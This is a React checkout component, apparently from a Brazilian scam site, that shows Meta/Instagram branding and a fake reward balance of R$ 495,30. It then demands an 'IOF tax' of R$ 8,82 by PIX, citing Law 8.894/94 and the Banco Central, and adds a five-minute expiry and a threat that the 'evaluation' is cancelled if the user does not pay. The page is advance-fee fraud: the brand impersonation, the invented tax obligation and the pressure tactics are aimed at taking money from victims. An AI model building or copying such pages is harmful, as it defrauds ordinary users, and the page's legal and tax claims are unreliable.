"use client"

import { motion } from "framer-motion"
import { Card, CardContent } from "@/components/ui/card"
import { useState, useEffect } from "react"
import { getUTMParams, navigateWithUTM } from "@/lib/utm-manager"

interface CheckmarkProps {
  size?: number
  strokeWidth?: number
  color?: string
  className?: string
}

const draw = {
  hidden: { pathLength: 0, opacity: 0 },
  visible: (i: number) => ({
    pathLength: 1,
    opacity: 1,
    transition: {
      pathLength: {
        delay: i * 0.2,
        type: "spring",
        duration: 1.5,
        bounce: 0.2,
        ease: "easeInOut",
      },
      opacity: { delay: i * 0.2, duration: 0.2 },
    },
  }),
}

export function Checkmark({ size = 100, strokeWidth = 2, color = "currentColor", className = "" }: CheckmarkProps) {
  return (
    <motion.svg
      width={size}
      height={size}
      viewBox="0 0 100 100"
      initial="hidden"
      animate="visible"
      className={className}
    >
      <title>Animated Checkmark</title>
      <defs>
        <linearGradient id="instagram-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stopColor="#F56040" />
          <stop offset="30%" stopColor="#E1306C" />
          <stop offset="70%" stopColor="#C13584" />
          <stop offset="100%" stopColor="#833AB4" />
        </linearGradient>
      </defs>
      <motion.circle
        cx="50"
        cy="50"
        r="40"
        stroke="url(#instagram-gradient)"
        variants={draw}
        custom={0}
        style={{
          strokeWidth,
          strokeLinecap: "round",
          fill: "transparent",
        }}
      />
      <motion.path
        d="M30 50L45 65L70 35"
        stroke="url(#instagram-gradient)"
        variants={draw}
        custom={1}
        style={{
          strokeWidth,
          strokeLinecap: "round",
          strokeLinejoin: "round",
          fill: "transparent",
        }}
      />
    </motion.svg>
  )
}

function MetaLogo({ size = 120 }: { size?: number }) {
  return (
    <div className="flex items-center justify-center gap-2">
      <img
        src="/images/design-mode/Instagram-Meta-Logo-PNG-1%281%29%281%29%281%29.png"
        alt="Meta Logo"
        className="h-8 w-auto"
      />
    </div>
  )
}

export default function CurrencyTransfer() {
  const [showContent, setShowContent] = useState(false)
  const [showIOFText, setShowIOFText] = useState(false)
  const [pixPayload, setPixPayload] = useState("")
  const [showPixPayment, setShowPixPayment] = useState(false)
  const [pixTransactionId, setPixTransactionId] = useState("")
  const [isCreatingPixPayment, setIsCreatingPixPayment] = useState(false)
  const [pixCopied, setPixCopied] = useState(false)
  const [pixLoadingComplete, setPixLoadingComplete] = useState(false)
  const [paymentApproved, setPaymentApproved] = useState(false)

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowContent(true)
    }, 2000) // Show content after checkmark animation completes

    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    if (showContent) {
      const iofTimer = setTimeout(() => {
        setShowIOFText(true)
      }, 5000) // Switch to IOF text after 5 seconds

      return () => clearTimeout(iofTimer)
    }
  }, [showContent])

  const checkPaymentStatus = async (transactionId: string) => {
    try {
      const interval = setInterval(async () => {
        const response = await fetch(`/api/check-payment-status?id=${transactionId}`)
        const data = await response.json()

        if (data.status === "AUTHORIZED" || data.status === "PAID") {
          clearInterval(interval)
          setPaymentApproved(true)
          setTimeout(() => {
            navigateWithUTM("/taxaiof")
          }, 2000)
        }
      }, 5000)

      // Parar polling após 10 minutos
      setTimeout(() => clearInterval(interval), 10 * 60 * 1000)
    } catch (error) {
      console.error("Error checking payment status:", error)
    }
  }

  const createPixPayment = async () => {
    console.log("[v0] Starting PIX payment creation for IOF")
    setIsCreatingPixPayment(true)
    setShowPixPayment(true)

    try {
      const utmParams = getUTMParams()

      const transactionData = {
        external_id: `emagrecimento-ja-${Date.now()}`,
        amount: 8.82, // Updated price from 14.9 to 8.82
        clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
        payer: {
          name: "UPP",
          email: "cliente@email.com",
          document: "18219822821",
        },
        utm_params: utmParams,
      }

      console.log("[v0] Creating IOF PIX payment with data:", transactionData)

      const response = await fetch("/api/keyclub/deposit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(transactionData),
      })

      const result = await response.json()

      console.log("[v0] IOF PIX payment response:", result)

      if (result.hasError) {
        console.error("[v0] IOF PIX payment error:", result)
        throw new Error(result.message || "Erro ao criar pagamento PIX")
      }

      const transactionId = result.id || result.transaction_id || result.external_id
      const pixPayload = result.pix?.payload || result.pix_code || result.qr_code

      if (!transactionId || !pixPayload) {
        console.error("[v0] Missing required fields in response:", result)
        throw new Error("Resposta da API incompleta")
      }

      console.log("[v0] Setting IOF PIX data - ID:", transactionId, "Payload length:", pixPayload.length)
      setPixTransactionId(transactionId)
      setPixPayload(pixPayload)

      setTimeout(() => {
        setPixLoadingComplete(true)
      }, 3000)

      checkPaymentStatus(result.id)
    } catch (error) {
      console.error("[v0] Erro ao criar pagamento PIX IOF:", error)
      const errorMessage = error instanceof Error ? error.message : "Erro desconhecido"
      alert(`Erro ao processar pagamento: ${errorMessage}. Tente novamente.`)
      setShowPixPayment(false)
      setPixLoadingComplete(false)
    } finally {
      console.log("[v0] IOF PIX creation finished")
      setIsCreatingPixPayment(false)
    }
  }

  const copyPixCode = async () => {
    try {
      await navigator.clipboard.writeText(pixPayload)
      setPixCopied(true)
      setTimeout(() => setPixCopied(false), 2000)
    } catch (error) {
      console.error("Erro ao copiar código PIX:", error)
    }
  }

  const handlePaymentRedirect = () => {
    createPixPayment()
  }

  if (showPixPayment) {
    return (
      <div className="h-screen w-screen bg-white flex flex-col overflow-hidden">
        <div className="flex-1 flex items-center justify-center p-4">
          <div className="bg-white w-full max-w-md mx-auto p-6 rounded-lg shadow-lg">
            <div className="text-center space-y-4">
              <h2 className="text-xl font-bold text-zinc-900">Pagamento PIX - IOF</h2>
              <p className="text-sm text-zinc-600">Valor: R$ 8,82</p>

              {!pixLoadingComplete ? (
                <div className="space-y-3">
                  <div className="flex justify-center">
                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                  </div>
                  <p className="text-sm text-zinc-600">Gerando código PIX...</p>
                </div>
              ) : paymentApproved ? (
                <div className="space-y-3">
                  <div className="flex justify-center">
                    <Checkmark size={60} strokeWidth={3} color="rgb(34 197 94)" />
                  </div>
                  <p className="text-sm font-medium text-green-600">Pagamento aprovado!</p>
                  <p className="text-xs text-zinc-500">Redirecionando...</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {pixPayload && (
                    <>
                      <div className="bg-white p-4 rounded-lg border-2 border-dashed border-zinc-300">
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixPayload)}`}
                          alt="QR Code PIX"
                          className="w-48 h-48 mx-auto"
                        />
                      </div>

                      <div className="space-y-2">
                        <p className="text-xs text-zinc-600">Código PIX:</p>
                        <div className="bg-zinc-100 p-3 rounded-lg">
                          <p className="text-xs font-mono break-all text-zinc-800">{pixPayload.substring(0, 50)}...</p>
                        </div>

                        <div className="bg-yellow-50 border border-yellow-200 rounded-md p-2 mb-2">
                          <p className="text-xs text-yellow-800 font-medium text-center">
                            ⚠️ Atenção: Após realizar o pagamento via PIX, retorne ao site para liberar seu saldo.
                          </p>
                        </div>

                        <div className="bg-yellow-50 border border-yellow-200 rounded-md p-2 mb-2">
                          <p className="text-xs text-yellow-800 font-medium text-center">
                            ⚠️ Atenção: este Pix expira em 5 minutos. Conclua o pagamento para que suas respostas sejam
                            avaliadas e recompensadas.
                          </p>
                        </div>

                        <div className="bg-red-50 border border-red-200 rounded-md p-2 mb-2">
                          <p className="text-xs text-red-800 font-medium text-center">
                            Lembrando: Caso não efetue o pagamento, sua avaliação será anulada e cancelada.
                          </p>
                        </div>

                        <button
                          onClick={copyPixCode}
                          className="w-full py-2 px-4 bg-blue-600 text-white rounded-lg font-medium text-sm hover:bg-blue-700 transition-colors"
                        >
                          {pixCopied ? "Código Copiado!" : "Copiar Código PIX"}
                        </button>
                      </div>

                      <div className="text-center">
                        <p className="text-xs text-zinc-500">Aguardando pagamento...</p>
                        <div className="flex justify-center mt-2">
                          <div className="animate-pulse flex space-x-1">
                            <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                            <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                            <div className="w-2 h-2 bg-blue-600 rounded-full"></div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="h-screen w-screen bg-white flex flex-col overflow-hidden">
      {!showContent ? (
        <div className="flex-1 flex items-center justify-center">
          <Card className="w-full h-full flex flex-col justify-center dark:bg-white dark:border-zinc-200 backdrop-blur-sm bg-transparent border-transparent">
            <CardContent className="space-y-4 flex flex-col items-center justify-center">
              <motion.div
                className="flex justify-center"
                initial={{ opacity: 0, scale: 0.8 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{
                  duration: 0.4,
                  ease: [0.4, 0, 0.2, 1],
                  scale: {
                    type: "spring",
                    damping: 15,
                    stiffness: 200,
                  },
                }}
              >
                <div className="relative">
                  <motion.div
                    className="absolute inset-0 blur-xl bg-emerald-500/10 dark:bg-emerald-500/20 rounded-full"
                    initial={{ opacity: 0, scale: 0.8 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{
                      delay: 0.2,
                      duration: 0.8,
                      ease: "easeOut",
                    }}
                  />
                  <Checkmark
                    size={80}
                    strokeWidth={4}
                    color="rgb(16 185 129)"
                    className="relative z-10 dark:drop-shadow-[0_0_10px_rgba(0,0,0,0.1)]"
                  />
                </div>
              </motion.div>
              <motion.div
                className="space-y-2 text-center w-full"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{
                  delay: 0.2,
                  duration: 0.6,
                  ease: [0.4, 0, 0.2, 1],
                }}
              >
                <div className="flex items-center gap-4"></div>
              </motion.div>
            </CardContent>
          </Card>
        </div>
      ) : (
        <motion.div
          className="flex-1 flex items-center justify-center"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
        >
          <motion.div
            className="bg-white dark:bg-zinc-900 w-full h-full p-4 shadow-2xl overflow-y-auto"
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            transition={{ duration: 0.4, ease: [0.4, 0, 0.2, 1] }}
          >
            <div className="text-center space-y-3">
              <motion.div
                initial={{ opacity: 0, y: -10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.2, duration: 0.5 }}
              >
                <MetaLogo size={120} />
              </motion.div>

              <motion.div
                className="space-y-2"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5 }}
              >
                <h3 className="text-lg font-semibold text-zinc-900 dark:text-zinc-100">
                  {"Taxa de Câmbio (Banco central) "}
                </h3>

                {!showIOFText ? (
                  <>
                    <div className="flex justify-center">
                      <img
                        src="/images/design-mode/KiQHFV-q5XI_144%281%29%281%29%281%29.gif"
                        alt="Loading animation"
                        className="w-12 h-auto"
                      />
                    </div>
                    <p className="text-xs text-zinc-600 dark:text-zinc-400">
                      Aguarde só um instante... Estamos realizando sua transferencia!
                    </p>
                  </>
                ) : (
                  <motion.div
                    className="text-left space-y-2"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.5 }}
                  >
                    <div className="bg-yellow-50 border border-yellow-200 rounded-md p-2 flex items-center gap-1">
                      <span className="text-yellow-600 text-sm">⚠️</span>
                      <span className="text-xs font-medium text-yellow-800">Imposto (IOF) obrigatório</span>
                    </div>

                    <h4 className="text-sm font-bold text-zinc-900 dark:text-zinc-100 text-center">
                      Imposto sobre Operações Financeiras (IOF)
                    </h4>

                    <p className="text-xs text-zinc-600 dark:text-zinc-400 text-center">
                      {
                        "Devido à nova reforma tributária, o pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido pelo Banco Central do Brasil, conforme a Lei nº 8.894/94."
                      }
                    </p>
                    <p className="text-xs text-red-600 dark:text-red-400 font-medium text-center">
                      * Necessário para receber o valor acumulado.
                    </p>

                    <div className="bg-gray-50 dark:bg-zinc-800 rounded-md p-2 space-y-1">
                      <h5 className="text-xs font-bold text-zinc-900 dark:text-zinc-100">Resumo</h5>

                      <div className="space-y-1">
                        <div className="flex justify-between items-center">
                          <span className="text-xs text-zinc-600 dark:text-zinc-400">Valor ganho base</span>
                          <span className="text-xs font-medium text-zinc-900 dark:text-zinc-100">R$ 495,30</span>
                        </div>

                        <div className="flex justify-between items-center">
                          <span className="text-xs text-zinc-600 dark:text-zinc-400">Taxa IOF</span>
                          <span className="text-xs font-medium text-red-600">-R$ 8,82</span>
                        </div>

                        <hr className="border-zinc-200 dark:border-zinc-700" />

                        <div className="flex justify-between items-center">
                          <span className="text-xs font-bold text-zinc-900 dark:text-zinc-100">Total final</span>
                          <span className="text-sm font-bold text-green-600">R$ 486,48</span>
                        </div>
                      </div>
                    </div>

                    <motion.button
                      onClick={handlePaymentRedirect}
                      className="w-full py-2 px-4 rounded-lg font-bold text-white text-sm mt-3 shadow-lg hover:shadow-xl transition-all duration-300"
                      style={{
                        background: "linear-gradient(45deg, #F56040 0%, #E1306C 30%, #C13584 70%, #833AB4 100%)",
                      }}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.3, duration: 0.5 }}
                      whileHover={{ scale: 1.02 }}
                      whileTap={{ scale: 0.98 }}
                    >
                      Pagar Imposto Sobre a Taxa
                    </motion.button>

                    <p className="text-xs text-zinc-500 dark:text-zinc-400 text-center mt-2 leading-tight">
                      Conforme Lei n° 8.894/94, todo valor pago é exigido pelos órgãos financeiros. Transferencia IOF,
                      transferência bancaria ou cartão são considerados com as regulamentações legais vigentes.
                    </p>
                  </motion.div>
                )}
              </motion.div>
            </div>
          </motion.div>
        </motion.div>
      )}
    </div>
  )
}
